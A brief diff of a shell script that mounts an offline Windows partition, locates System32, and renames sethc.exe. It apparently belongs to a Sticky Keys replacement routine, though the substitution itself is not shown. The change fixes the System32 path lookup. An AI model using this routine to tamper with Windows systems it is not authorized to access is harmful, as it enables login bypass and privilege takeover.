@@ -9,7 +9,7 @@ do
 	mount /dev/$deviceblk /winmount
 	cd /winmount
 	win=$(ls | grep -i windows)
-	sys=$(ls | grep -i system32)
+	sys=$(ls $win | grep -i system32)
 	ls -la $win/$sys/sethc.exe
 	if [ $? -eq 0 ]; then
 		mv $win/$sys/sethc.exe $win/$sys/sethc$random.exe
